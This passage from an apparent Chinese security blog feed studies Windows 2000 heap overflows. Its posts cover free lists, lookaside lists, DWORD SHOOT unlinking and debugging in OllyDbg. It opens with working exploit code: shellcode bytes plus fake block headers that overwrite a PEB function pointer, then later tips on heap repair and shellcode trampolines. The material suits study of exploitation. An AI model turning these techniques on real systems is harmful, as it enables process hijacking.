    // MessageBoxA with tile "failwest" and context "failwest"
    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"

    "\x16\x01\x1A\x00\x00\x10\x00\x00"    // head of the ajacent free block
    "\x88\x06\x36\x00\x20\xf0\xfd\x7f";    // 0x00360688 is the address of shellcode in first heap block
                                        // you have to make sure this address via debug
                                        // 0x7ffdf020 is the position in the PEB which hold a pointer to
                                        // RtlEnterCriticalSection() and will called by ExitProcess() at last


int main()
{
    HLOCAL h1=0, h2=0;
    HANDLE hp;
    hp = HeapCreate(0, 0x1000, 0x10000);
    h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 200);
    //__asm int 3        //used to break process
    memcpy(h1, shellcode, 0x200);    //overflow, 0x200=512
    h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8);
    return 0;
}
</code></pre>


<h3 id="3-堆溢出利用的注意事项"><a href="#3-堆溢出利用的注意事项" class="headerlink" title="3 堆溢出利用的注意事项"></a>3 堆溢出利用的注意事项</h3><h4 id="3-1-调试堆与常态堆的区别"><a href="#3-1-调试堆与常态堆的区别" class="headerlink" title="3.1 调试堆与常态堆的区别"></a>3.1 调试堆与常态堆的区别</h4><p>使用常态堆的方法：</p>
<ol>
<li>插入int 3中断指令（仅限于你能修改源码）</li>
<li>直接修改用于检测调试器的函数的返回值</li>
</ol>
<h4 id="3-2-在shellcode中修复环境"><a href="#3-2-在shellcode中修复环境" class="headerlink" title="3.2 在shellcode中修复环境"></a>3.2 在shellcode中修复环境</h4><p>本实验中就遇到了这种问题，在劫持进程后需要立刻修复P.E.B中的函数指针，否则会引起很多其他异常。</p>
<p>shellcode中的第一条指令CDF也是用来修复环境的，如果去掉，会发现shellcode自身发生内存读写异常。这是因为ExitProcess()调用时，这种特殊的上下文会把通常状态为0的DF标志 位修改为1.这会导致shellcode中的LODS DWORD PTR DS:[ESI]指令在向EAX装入第一个hash后将ESI减4，而不是通常的加4，从而在下一个函数名hash读取时发生错误。</p>
<p>比较简单的修复步骤：</p>
<ol>
<li>在堆区偏移0x28的地方存放着堆区所有空闲块的总和TotalFreeSize</li>
<li>把一个较大块（或干脆直接找个暂时不用的区域伪造一个块首）块首中标识自身大小的两个字节（self size）修改成堆区空闲块总容量大小（TotalFreeSize）</li>
<li>把该块的flag位设置为0x10（last entry尾块）</li>
<li>把freelist[0]的前向指针和后向指针指向这个堆块</li>
</ol>
<h4 id="3-3-定位shellcode的跳板"><a href="#3-3-定位shellcode的跳板" class="headerlink" title="3.3 定位shellcode的跳板"></a>3.3 定位shellcode的跳板</h4><p>经常会有寄存器指向堆区离shellcode不远的地方，使用几种指令作为跳板定位shellcode。这些指令一般位于netapi32.dll、user32.dll、rpcrt4.dll中找到</p>
<pre><code>
CALL DWORD PTR [EDI+0X78]
CALL DWORD PTR [ESI+0X4C]
CALL DWORD PTR [EBP+0X74]
</code></pre>

]]></content>
      
        <categories>
            
            <category> 安全技术 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> windows </tag>
            
            <tag> heap </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[堆溢出利用（上）——DWORD SHOOT]]></title>
      <url>/2017/06/26/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%EF%BC%88%E4%B8%8A%EF%BC%89%E2%80%94%E2%80%94DWORD-SHOOT/</url>
      <content type="html"><![CDATA[<h3 id="1-堆表“拆卸”中的问题"><a href="#1-堆表“拆卸”中的问题" class="headerlink" title="1 堆表“拆卸”中的问题"></a>1 堆表“拆卸”中的问题</h3><p>堆管理系统的三类操作：堆块分配、堆块释放和堆块合并归根结底都是对链表的修改。分配是将堆块从空表中“卸下”；释放是把堆块“链入”空表；合并也可以看做将若干个堆块先从空表中卸下，修改块首信息（大小），之后把更新后的新块“链入”空表。</p>
<p>“卸下”和“链入”的过程就有可能获得一次读写内存的机会。</p>
<p>堆溢出利用的精髓就是用精心构造的数据去溢出下一个堆块的块首，改写块首中的前向指针(flink)和后向指针(blink)，然后分配、释放、合并等操作发生时伺机获得一次向内存任意地址写入任意数据的机会。</p>
<p>能向内存任意地址写入任意数据的机会成为&quot;DWORD SHOOT&quot;（&quot;arbitrary DWORD reset&quot;）。其发生时，不但可以控制射击的目标(任意地址)，还可以选用适当的子弹(4字节恶意数据)。</p>
<p>DWORD SHOOT可以劫持进程。</p>
<table>
<thead>
<tr>
<th>点射目标(Target)</th>
<th>子弹(Payload)</th>
<th>改写的结果</th>
</tr>
</thead>
<tbody>
<tr>
<td>栈帧中的函数返回地址</td>
<td>shellcode起始地址</td>
<td>函数返回时，跳去执行shellcode</td>
</tr>
<tr>
<td>栈帧中的S.E.H句柄</td>
<td>shellcode起始地址</td>
<td>异常发生时，跳去执行shellcode</td>
</tr>
<tr>
<td>重要函数调用地址</td>
<td>shellcode起始地址</td>
<td>函数调用时,跳去执行shellcode</td>
</tr>
</tbody>
</table>
<h3 id="2-DWORD-SHOOT-举例"><a href="#2-DWORD-SHOOT-举例" class="headerlink" title="2 DWORD SHOOT 举例"></a>2 DWORD SHOOT 举例</h3><p>这里举的是将一个结点从双向链表中“卸下”时可能发生的问题:</p>
<pre><code>int remove(ListNode *node)
{
    node-&gt;blink-&gt;flink = node-&gt;flink;
    node-&gt;flink-&gt;blink = node-&gt;blink;
    return 0;
}
</code></pre><p>通过这个函数逻辑，得到下图缩水的链表变化过程。<br><img src="/images/2017-06-26/remove_node.jpg" alt="卸载结点的过程图"></p>
<p><font color="#f00">当堆溢出发生时，非法数据会淹没下一个堆块块首。即块首中存放的前向指针和后向指针可以被攻击者伪造，当这个堆块从双向链表中卸下时，node-&gt;blink-&gt;flink=node-&gt;flink将把伪造的flink指针值写入伪造的blink所指向的地址中去，从而发生DWORD SHOOT。</font><br><img src="/images/2017-06-26/dword_shoot.jpg" alt="DWORD SHOOT发生的原理"></p>
<h3 id="3-调试中体会DWORD-SHOOT"><a href="#3-调试中体会DWORD-SHOOT" class="headerlink" title="3 调试中体会DWORD SHOOT"></a>3 调试中体会DWORD SHOOT</h3><p>代码如下:</p>
<pre><code>#include &lt;windows.h&gt;

int main()
{
    HLOCAL h1,h2,h3,h4,h5,h6;
    HANDLE hp;
    hp = HeapCreate(0, 0x1000, 0x10000);
    h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8);
    h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8);
    h3 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8);
    h4 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8);
    h5 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8);

    h6 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8);
    __asm int 3        // used to break the process
    //free the odd blocks to prevent coalesing
    HeapFree(hp, 0, h1);
    HeapFree(hp, 0, h3);
    HeapFree(hp, 0, h5);    //now freelist[2] got 3 entries

    //will allocate from freelist[2] which means unlink the last entry(h5)
    h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8);

    return 0;
}
</code></pre><p>(1) 程序首先创建了一个大小为0x1000的堆区，并从其中连续申请了6个大小为8字节的堆块（加上堆首就是16字节），这应该会从大块上切下来。<br>(2) 释放奇数次申请的堆块为了防止堆块合并的发生。<br>(3) 三次释放结束后，freelist[2]所标识的空表中应该链入了3个空闲链表，它们一次是h1、h3、h5。<br>(4) 再次申请8字节的堆块，应该从freelist[2]所标识的空表中分配，这意味着最后一个堆块h5被从空表中拆下。<br>(5) 如果我们手动修改h5块首中的指针，应该能够观察到DWORD SHOOT的发生。</p>
<p>将代码执行到0x0040112E处，此时三次内存释放操作结束。此时堆块状况如下：<br><img src="/images/2017-06-26/freelist.jpg" alt="空表索引"><br><b><center>空表索引</center></b><br><img src="/images/2017-06-26/freelist2.jpg" alt="空表索引"><br><b><center>堆块状况</center></b></p>
<p>从0x0040112E处开始，共有7个堆块，如表所示：</p>
<p><b><center>堆块使用状况</center></b></p>
<table>
<thead>
<tr>
<th></th>
<th>起始位置</th>
<th>Flag</th>
<th>Size 单位:8bytes</th>
<th>前向指针</th>
<th>后向指针</th>
</tr>
</thead>
<tbody>
<tr>
<td>h1</td>
<td>0x00360680</td>
<td>空闲态0x00</td>
<td>0x0002</td>
<td>0x003606A8</td>
<td>0x00360188</td>
</tr>
<tr>
<td>h2</td>
<td>0x00360690</td>
<td>占用态0x01</td>
<td>0x0002</td>
<td>无</td>
<td>无</td>
</tr>
<tr>
<td>h3</td>
<td>0x003606A0</td>
<td>空闲态0x00</td>
<td>0x0002</td>
<td>0x003606C8</td>
<td>0x00360688</td>
</tr>
<tr>
<td>h4</td>
<td>0x003606B0</td>
<td>占用态0x01</td>
<td>0x0002</td>
<td>无</td>
<td>无</td>
</tr>
<tr>
<td>h5</td>
<td>0x003606C0</td>
<td>空闲态0x00</td>
<td>0x0002</td>
<td>0x00360188</td>
<td>0x003606A8</td>
</tr>
<tr>
<td>h6</td>
<td>0x003606D0</td>
<td>占用态0x01</td>
<td>0x0002</td>
<td>无</td>
<td>无</td>
</tr>
<tr>
<td>尾块</td>
<td>0x003606E0</td>
<td>最后一项0x10</td>
<td>0x0124</td>
<td>0x00360178<br>(freelist[0])</td>
<td>0x00360178<br>(freelist[0])</td>
</tr>
</tbody>
</table>
<p>除了freelist[0]和freelist[2]之外，所有的空表索引都为空（指向自身）。结合上面给出的空表索引图，我们可以得到freelist[2]链表的组织情况。如图所示：<br><img src="/images/2017-06-26/freelist3.jpg" alt="链表组织情况"></p>
<p>在执行最后一次8字节的内存请求时会把freelist[2]的最后一项（原来的h5）分配出去，这意味着将最后一个结点从双向链表中卸下。</p>
<p>如果直接修改在内存中h5堆块中的空表指针（当然攻击发生时是由于溢出改写的），那么应该能够观察到DWORD SHOOT现象。</p>
<p>如图所示，直接在调试器中手动将0x003606C8处的前向指针改为0x44444444,后向指针改为0x00000000。当最后一个分配函数被调用后，调试器被异常中断，原因是无法将0x44444444写入0x00000000.当然，如果把射击目标定位合法地址，这条指令执行后 0x44444444将会被写入目标。</p>
<h3 id="4-说明"><a href="#4-说明" class="headerlink" title="4 说明"></a>4 说明</h3><p>事实上，堆块的分配、释放、合并等操作都能引发DWORD SHOOT(因为都涉及链表操作)，甚至快表也可以用来制造DWORD SHOOT。</p>
]]></content>
      
        <categories>
            
            <category> 安全技术 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> windows </tag>
            
            <tag> heap </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[堆溢出研究试验]]></title>
      <url>/2017/06/24/%E5%A0%86%E6%BA%A2%E5%87%BA%E7%A0%94%E7%A9%B6%E8%AF%95%E9%AA%8C/</url>
      <content type="html"><![CDATA[<h3 id="1-环境准备"><a href="#1-环境准备" class="headerlink" title="1. 环境准备"></a>1. 环境准备</h3><font color="#f00"><br>针对堆进行调试，我整整花了3天时间，中间多次想不再进行调试！开始觉得还没怎么调试就结束，这不太好...中间觉得离最终能够调试已经很近了，加油...最后觉得已经到了这一步了，放弃就怪可惜的<br>哎！人就是这样矛盾的生物<br></font>

<p>话归正传，我们来看看调试所需要的环境</p>
<table>
<thead>
<tr>
<th>软件</th>
<th style="text-align:left">备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>Windows 2000虚拟机</td>
<td style="text-align:left">无论你用的VMware，亦或是Virtualbox，请确保windows 2000能够正常复制粘贴，很多朋友都是在此处浪费了大量时间，我也不例外</td>
</tr>
<tr>
<td>VC6.0</td>
<td style="text-align:left">无论是纯净版还是绿色版，只要能用即可！<br>注意在调试程序的时候勾选：工具-&gt;选项-&gt;调试中的实时调试 ；<br>而且还应该调成Release版本：组建(Build)-&gt;移除工程配置，双击other - Win32 Release</td>
</tr>
<tr>
<td><a href="http://www.ollydbg.de/" target="_blank" rel="external">Ollydbg</a></td>
<td style="text-align:left">建议大家使用Ollydbg110版本，因为我此版本测试通过！而吾爱破解专用版Ollydbg无法正常使用，大家切忌使用此版本，否则十分坑爹！<br>启动od，然后点击option-&gt;just-in-time debugging选中Make ollydbg Just-in-time debugger并确认，最后重启od</td>
</tr>
</tbody>
</table>
<h3 id="2-堆的数据结构"><a href="#2-堆的数据结构" class="headerlink" title="2. 堆的数据结构"></a>2. 堆的数据结构</h3><h4 id="2-1-堆块"><a href="#2-1-堆块" class="headerlink" title="2.1 堆块"></a>2.1 堆块</h4><p>1） 堆块分为块首和块身<br>块首是堆块头部的几个字节，用来标识这个堆块自身的信息，包括本块的大小、本块空闲还是占用等信息；<br>块身紧跟在块首后面的部分，是最终分配给用户使用的数据区。</p>
<p>2） 块首大小为（8字节）</p>
<p><img src="/images/2017-06-24/heap_structure.jpg" alt="堆块的基础数据结构"></p>
<p>3） 空闲态的堆块在块首后有两个指针</p>
<h4 id="2-2-堆表（空表和快表）"><a href="#2-2-堆表（空表和快表）" class="headerlink" title="2.2 堆表（空表和快表）"></a>2.2 堆表（空表和快表）</h4><p>位于堆区的起始位置，用于索引堆区中堆块的重要信息。堆表的数据结构决定了整个堆区的组织方式。堆表在设计时可能会考虑采用平衡二叉树等高级数据结构用于优化查找效率。现代操作系统的堆表往往不止一种数据结构。</p>
<p>在windows中，占用态的堆块被使用它的程序索引，而堆表只索引所有空闲态的堆块。</p>
<p><img src="/images/2017-06-24/heap_list.png" alt="堆表"></p>
<h5 id="1）-空表：双向回环链表-Freelist"><a href="#1）-空表：双向回环链表-Freelist" class="headerlink" title="1） 空表：双向回环链表(Freelist)"></a>1） 空表：双向回环链表(Freelist)</h5><p>堆区一开始的堆表区中有一个128项的指针数组（看到有人说把它看成队列的），被称作空表索引。该数组的每一项包含两个指针，用于表示一条空表。<br>free[1] 标识了所有堆中所有大小为8字节的空闲堆块，之后每个索引指示的空闲堆块递增8个字节。即：<br>free[2]标识了16个字节的空闲堆块。<br>free[k] 标识了 k * 8 个字节的空闲堆块。<br>指示第1项空表索引比较特殊，从图中我们也可以看到：这条双向链表链入了所有大于等于1024字节的堆块（小于512KB），堆块按照升序排列。</p>
<p><img src="/images/2017-06-24/freelist.jpg" alt="空表"></p>
<h5 id="2）-快表：单向链表-Lookaside"><a href="#2）-快表：单向链表-Lookaside" class="headerlink" title="2） 快表：单向链表(Lookaside)"></a>2） 快表：单向链表(Lookaside)</h5><p>快速单项链表是Windows用来加速堆块分配而采用的一种堆表。这类单项链表不会发生堆块合并（其中的空闲块块首会被设置为占用态，用来防止堆块合并）。</p>
<p>快速单项链表有128条，组织结构与空闲双向链表类似，只是其中的堆块按照单项链表组织。快表总是被初始化为空，而且每条快表最多只有4个结点，故很快就会被填满。</p>
<p><img src="/images/2017-06-24/lookaside.jpg" alt="快表"></p>
<h5 id="3）-区别"><a href="#3）-区别" class="headerlink" title="3） 区别"></a>3） 区别</h5><p>a) 以上两个都为128大小的指针数组 （空表每一项有两个指针，快表每一项有一个指针）<br>b) 快表最多只有四个节点<br>c) 空表除了数组的第一个元素外其他分别链接：数组下标*8 大小的堆块，数组的第一个元素链接着大于1kb的堆块，并升序排序<br>d) 快表的堆块处于占用状态，不会发生堆块合并<br>e) 快表的只存在精确分配，快表优先空表分配</p>
<h4 id="2-3-内存块"><a href="#2-3-内存块" class="headerlink" title="2.3 内存块"></a>2.3 内存块</h4><h5 id="小块（小于1kb）"><a href="#小块（小于1kb）" class="headerlink" title="小块（小于1kb）"></a>小块（小于1kb）</h5><p>分配方式：优先快表，其次空表非零元素（free[0]），然后堆缓存，最后空表零元素。否则就紧缩，然后再尝试。再否则就返回NULL<br>释放：优先链入快表（只能链入4个空闲块），如果快表满则链入相应的空表</p>
<h5 id="大块（大于1kb小于512kb）"><a href="#大块（大于1kb小于512kb）" class="headerlink" title="大块（大于1kb小于512kb）"></a>大块（大于1kb小于512kb）</h5><p>分配方式：优先堆缓存，其次空表零元素<br>释放： 优先放入堆缓存，若堆缓存满则链入freelist[0]</p>
<h5 id="巨块（大于512kb）"><a href="#巨块（大于512kb）" class="headerlink" title="巨块（大于512kb）"></a>巨块（大于512kb）</h5><p>分配方式：虚分配<br>释放：直接释放</p>
<h3 id="3-堆结构的验证和分析"><a href="#3-堆结构的验证和分析" class="headerlink" title="3 堆结构的验证和分析"></a>3 堆结构的验证和分析</h3><p>在堆中进行内存分配的时候，C语言函数调用的是malloc()函数，c++中调用new()函数，当动态调试进入函数内部的时候察觉此两个函数调用的都是底层ntdll.dll中的RtAllocateHeap()函数，所有的windows分配堆的函数在底层调用的都是此函数，这也死程序员可以看到的关于堆的最底层函数。因此研究堆分配，重点关注此函数即可。</p>
<h4 id="3-1-堆的调试"><a href="#3-1-堆的调试" class="headerlink" title="3.1 堆的调试"></a>3.1 堆的调试</h4><p>在此之前需要理解一个概念：调试堆与调试栈不同，不能直接加载或者attach 程序，否则堆管理策略就会采用调试状态下的堆管理策略，使用调试状态下的堆管理函数。</p>
<p>正常堆和调试堆的区别：<br>1.调试堆只采用空表分配，不采用快表分配<br>2.所有的堆块末尾都加上十六个字节的用来防止程序溢出，（仅仅是用来防止程序溢出，而不是堆溢出），其中这十六个字节包括：<font color="#f00">8个字节的0xAB 和 8个字节的0x00</font><br>3.块首的标志标志位不同，调试状态下的堆和正常堆的区别如同debug下的PE文件和release下的PE文件类似，做堆移除实验的时候，调试器中可以v正常运行的shellcode，单独运行却不行。很可能就是调试堆与正常堆的差异造成的。</p>
<p>为拉避免采用调试状态下的堆，我i们直接在程序中嵌入 int3 断点，然后调用实时调试器即可</p>
<h4 id="3-2-空表结构验证调试"><a href="#3-2-空表结构验证调试" class="headerlink" title="3.2 空表结构验证调试"></a>3.2 空表结构验证调试</h4><h5 id="3-2-1-验证代码"><a href="#3-2-1-验证代码" class="headerlink" title="3.2.1 验证代码"></a>3.2.1 验证代码</h5><pre><code>#include &lt;windows.h&gt;

int main()
{
     HLOCAL h1,h2,h3,h4,h5,h6;
     HANDLE hp;
     hp = HeapCreate(0, 0x1000, 0x10000);   //堆创建
     __asm int 3;

     h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 3);  //申请内存
     h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 5);
     h3 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 6);
     h4 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8);
     h5 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 19);
     h6 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 24);

     //free block and prevent coaleses
     //释放掉1、3、5,内存不相联不会发生堆块合并
     HeapFree(hp, 0 , h1);     // free to freelist[2]
     HeapFree(hp, 0 , h3);     // free to freelist[2]
     HeapFree(hp, 0 , h5);     // free to freelist[4]

     //内存相联，合并
     HeapFree(hp, 0 , h4);     // coalese h3, h4, h5, link the large  block to freelist[8]

     return 0;
}
</code></pre><h5 id="3-2-2-堆调试环境配置"><a href="#3-2-2-堆调试环境配置" class="headerlink" title="3.2.2 堆调试环境配置"></a>3.2.2 堆调试环境配置</h5><ol>
<li>在VC6.0中创建该工程，然后勾选：工具-&gt;选项-&gt;调试中的实时调试，并将运行结果设置为Release版本</li>
<li>在OllyDbg中&quot;Options&quot;菜单中选中&quot;Just-in-time debugging&quot;，单击&quot;Make OllyDbg just-in-time debugger&quot;，然后单击&quot;Done&quot;按钮确认。</li>
<li>运行上面程序之后，在系统出现错误提示的时候，选择&quot;取消&quot;<br><img src="/images/2017-06-24/debugging_mode.jpg" alt="选择调试"></li>
<li>然后可以在Ollydbg中进行调试，使用Alt+M可以查看当前内存映射状态，如图所示<br><img src="/images/2017-06-24/ollydbg.jpg" alt="OllyDbg中调试"></li>
</ol>
<h5 id="3-2-3-实验过程"><a href="#3-2-3-实验过程" class="headerlink" title="3.2.3 实验过程"></a>3.2.3 实验过程</h5><p>可以看出程序断点断在了VA=0x0040101D处，此时内存映射窗口也在上图中显示。其实你应该知道：进程堆地址为0x130000, S大小为0x6000。可以使用GetProcessHeap()获取函数句柄。<br><img src="/images/2017-06-24/process_heap.jpg" alt="获取进程堆地址"></p>
<p>其实本实验中的内存分配函数malloc()有属于自己的堆区（0x00340000，大小0x2000）.</p>
<h6 id="识别堆表"><a href="#识别堆表" class="headerlink" title="识别堆表"></a>识别堆表</h6><p>在程序初始化的过程中，malloc使用的堆和进程堆都已经经过了若干次分配和释放操作，里面的堆块相对比较“凌乱”，因此我们在程序中使用HeapCreate()函数创建一个新的堆，通过调试这个比较“整齐”的堆来理解堆管理。</p>
<font color="#f000">当HeapCreate()成功创建了堆区之后，会把整个堆区的起始地址返回给EAX，如上上图所示，地址为0x00360000</font><br>在内存映射窗口双击0x00360000地址所在行即可进入数据窗口。<br><font color="#f00">从0x00360000开始，堆表中包含的信息依次是段表索引（Segment List）、虚表索引（Virtual Allocation list）、空表使用标识（freelist usage bitmap）和空表索引区</font>

<p>当然，上面给出的区域并不完整，下面是我从网上找到的完整表述：</p>
<pre><code>
0:000> dt _HEAP 00080000
   +0x000 Entry           : _HEAP_ENTRY
   +0x008 Signature        : 0xeeffeeff
   +0x00c Flags           : 0x50000062
   +0x010 ForceFlags       : 0x40000060
   +0x014 VirtualMemoryThreshold : 0xfe00
   +0x018 SegmentReserve    : 0x100000
   +0x01c SegmentCommit     : 0x2000
   +0x020 DeCommitFreeBlockThreshold : 0x200
   +0x024 DeCommitTotalFreeThreshold : 0x2000
   +0x028 TotalFreeSize    : 0xcb
   +0x02c MaximumAllocationSize : 0x7ffdefff
   +0x030 ProcessHeapsListIndex : 1
   +0x032 HeaderValidateLength : 0x608
   +0x034 HeaderValidateCopy : (null)
   +0x038 NextAvailableTagIndex : 0
   +0x03a MaximumTagIndex  : 0
   +0x03c TagEntries       : (null)
   +0x040 UCRSegments      : (null)
   +0x044 UnusedUnCommittedRanges : 0x00080598 _HEAP_UNCOMMMTTED_RANGE
   +0x048 AlignRound       : 0x17
   +0x04c AlignMask        : 0xfffffff8
   <font color="#f00">+0x050 VirtualAllocdBlocks : _LIST_ENTRY [ 0x80050 - 0x80050 ]</font>
   <font color="#f00">+0x058 Segments      : [64] 0x00080640 _HEAP_SEGMENT</font>
   +0x158 u                : __unnamed
   +0x168 u2               : __unnamed
   +0x16a AllocatorBackTraceIndex : 0
   <font color="#f00">+0x16c NonDedicatedListLength : 1</font>
   +0x170 LargeBlocksIndex : (null)
   +0x174 PseudoTagEntries : (null)
   <font color="#f00">+0x178 FreeLists    : [128] _LIST_ENTRY [ 0x829b0 - 0x829b0 ]</font>
   +0x578 LockVariable     : 0x00080608 _HEAP_LOCK
   +0x57c CommitRoutine    : (null)
   <font color="#f00">+0x580 FrontEndHeap  : 0x00080688</font>
   +0x584 FrontHeapLockCount : 0
   +0x586 FrontEndHeapType : 0x1 ''
   +0x587 LastSegmentIndex : 0 ''
</code></pre>


<p>可以明显看出，空表开始位置在0x00360178处，其余的堆块一般与溢出利用关系不大。<br>当一个堆刚刚被初始化时，它的堆块状况是非常简单的：</p>
<ul>
<li>只有一个空闲态的大块(称为“尾块”)</li>
<li>偏移0x178的位置是空表的头，可以参见介绍空表时所用的图。如图可以看到，当前的freelist[0]的值是0x00360688，而其他元素都指向自身(蓝框指向0x00360688,红框指向自身地址)。（启用块表后0x688位置就是快表）<br><img src="/images/2017-06-24/freelist_test.jpg" alt="空表头"></li>
<li>Freelist[0]指向“尾块”，八个字节（前四个字节是前向指针，后四个字节时后巷指针，即：空表的一对指针），其余各项指向本身</li>
<li>除零号空表索引外，其余各项索引都指向自己，这意味着其余所有的空闲链表都没有空闲块。</li>
</ul>
<p><img src="/images/2017-06-24/heap_structure.jpg" alt="占用态"><br><b><center>占用态</center></b><br><img src="/images/2017-06-24/heap_structure2.jpg" alt="空闲态"><br><b><center>空闲态</center></b></p>
<p><b>占用态和空闲态的共同点</b></p>
<p>0-2 字节代表本快的大小（包括块首）<br>2-4字节表示计算单位是多少字节</p>
<p><b>占用态与空闲态的不同点</b></p>
<p>Flags出 占用态标志是1  空闲态标志是 0</p>
<p>空闲态块首后的八个字节为一对指针，分别是前向指针和后向指针。当堆块变为占用态的时候重新回分配数据。</p>
<font color="#f00">实际上尾块的起始位置是 0x360680， 一般引用堆块的指针都会跃过8字节的块首，直接指向数据区</font>

<p>因此根据地址 0x360680处八个字节的情况(参见下图)可以知道：此尾块的大小是 0x130  计算单位是 0x0008 个字节  总大小是 0x980字节 (0x130 * 0x8 = 0x980)。<br><img src="/images/2017-06-24/freelist_first.jpg" alt="尾块"></p>
<font color="#f00">注意：堆块的大小是包含块首在内的</font>

<h6 id="堆块的分配"><a href="#堆块的分配" class="headerlink" title="堆块的分配"></a>堆块的分配</h6><p>上面也讲了，堆块在分配的时候会将块首计算在内。所以程序中的费喷情况如下：</p>
<table>
<thead>
<tr>
<th>堆句柄</th>
<th>请求字节数</th>
<th>实际需要的字节数</th>
<th>实际分配（堆单位）</th>
<th>实际分配（字节）</th>
</tr>
</thead>
<tbody>
<tr>
<td>H1</td>
<td>3</td>
<td>11</td>
<td>2</td>
<td>16</td>
</tr>
<tr>
<td>H2</td>
<td>5</td>
<td>13</td>
<td>2</td>
<td>16</td>
</tr>
<tr>
<td>H3</td>
<td>6</td>
<td>14</td>
<td>2</td>
<td>16</td>
</tr>
<tr>
<td>H4</td>
<td>8</td>
<td>16</td>
<td>2</td>
<td>16</td>
</tr>
<tr>
<td>H5</td>
<td>19</td>
<td>27</td>
<td>4</td>
<td>32</td>
</tr>
<tr>
<td>H6</td>
<td>24</td>
<td>32</td>
<td>4</td>
<td>32</td>
</tr>
</tbody>
</table>
<p>直接在CPU窗口，命令F8单步执行程序到地址:0x0040102B处，这时我们执行完了<br>h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 3)<br>当h1被分配以后直接查看地址：0x00360178地址处的值（0x00360698）：<br><img src="/images/2017-06-24/freelist_test2.jpg" alt="h1"><br>此时的地址0x360178处的值已经从0x360688改变为0x360698  同时跳转到 0x360698,如下图：<br><img src="/images/2017-06-24/freelist_test3.jpg" alt="h1"><br>从图中可以看出：分配给h1的大小为0x0002, size=16bytes</p>
<font color="#00f"></font>

<p>接下来运行到地址0x00401059，此时h1~h6全部分配完，查看0x00360178的地址可以看出，值已经更改为0x00360708。接下来到0x00360680处进行查看</p>
<p>h1~h6的分配情况如下：<br><img src="/images/2017-06-24/freelist_test4.jpg" alt="h1-h6"></p>
<p>如上所示，现在的地址是：0x360700大小是0x120 = 0x130 - 0x2 * 4 - 0x4 * 2</p>
<p>以上从h1 - h6的分配情况验证啦 空表分配中的找零钱现象（从一个大块中依次一小块一小块地进行切割）</p>
<font color="#0f0">下面是我的一些思考：<br>首先，尾块上的指针指向什么？其实尾块上的指针表示的是没有分配完的区间有多大。因此如果要查看指针所指向的内容，应该找其Self Size中的内容。<br>例如上图中的0x700是尾块，那么h6中的data实际上应该是0x6E0~0x700。以此类推，可以找到h5，h4，h3，h2，h1中的数据雷荣。h1的堆块为0x680~0x690。<br></font>

<h6 id="堆块的释放"><a href="#堆块的释放" class="headerlink" title="堆块的释放"></a>堆块的释放</h6><p>接着上面的程序执行，直接执行到地址：00401077地址处<br>HeapFree(hp,0,h1); //free to freelist[2]<br>HeapFree(hp,0,h3); //free to freelist[2]<br>HeapFree(hp,0,h5); //free to freelist[4]<br>分别释放啦堆块 h1 h3 h5这样做是防止相邻堆块进行堆块的合并。直接查看地址 0x360178地址处的值重点观察变化的值如下图：<br><img src="/images/2017-06-24/freelist_test5.jpg" alt="地址变化"></p>
<p>从上图中可以发现地址 0x360188 的值发生啦变化 从原来的指向自身现在变为指向：0x360688  0x3608A8</p>
<p>地址0x360198处的值变化为： 0x003606C8 和 0x003606c8</p>
<p>由上图可知 h1 h3分别被释放到 freelist[2] 空表中， h5被释放到啦 freelist[4]空表中。</p>
<p>根据freelist【2】 的空表索引 以及h1 h3堆块的指针组，可以发现 ：<br><img src="/images/2017-06-24/freelist_test6.jpg" alt="链表结构"><br>如图所示左边箭头是前向指针，顺序为 Freelist -&gt; h1 &gt; h3  右边是后向指针 顺序是 h3&gt; h1 &gt; freelist[2]</p>
<p>对于h5堆块倒是没啥 ，freelist[5]直接索引到 地址 0x3606c8</p>
<h6 id="堆块的合并"><a href="#堆块的合并" class="headerlink" title="堆块的合并"></a>堆块的合并</h6><p>接着程序运行直接运行到地址 0x401080地址处，执行的是代码：</p>
<p>HeapFree(hp,0,h4); //coalese h3,h4,h5,link the large block to freelist[8]</p>
